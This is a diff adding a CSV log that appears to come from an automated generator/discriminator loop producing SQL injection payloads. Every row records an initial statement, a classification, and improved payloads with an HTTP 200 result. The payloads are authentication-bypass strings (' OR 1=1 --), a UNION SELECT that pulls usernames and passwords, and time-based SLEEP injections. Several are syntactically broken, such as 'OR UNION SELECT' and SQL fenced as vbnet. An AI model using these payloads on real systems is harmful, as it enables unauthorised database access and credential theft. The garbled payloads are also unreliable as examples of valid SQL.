@@ -1,0 +1,10 @@
+iteration,initial_payload,classification,reasoning,discriminator_improved_payload,generator_final_payload,test_result
+1,1. SELECT * FROM users WHERE username='admin' AND password='',No Effect,The given SQL injection payload does not have any injective part that can bypass the authentication or manipulate the database in an unexpected way.,'--' OR 1=1;,"```vbnet
+SELECT * FROM users WHERE username='admin' AND password='""' OR 1=1 --
+```",200
+1,"2. INSERT INTO users (username, password) VALUES ('admin', '123456')",No Effect,The given SQL injection payload does not have any injective syntax that can exploit the application.,"' OR UNION SELECT username, password FROM users --","```vbnet
+' OR UNION SELECT username, password FROM users WHERE username = 'admin' AND password = '123456' --
+```",200
+1,3. UPDATE users SET password = '' WHERE username = 'admin',No Effect,The SQL injection payload does not affect the response or behavior of the application.,' OR SLEEP(5) --,"```vbnet
+' OR 1=1 AND SLEEP(5)
+```",200
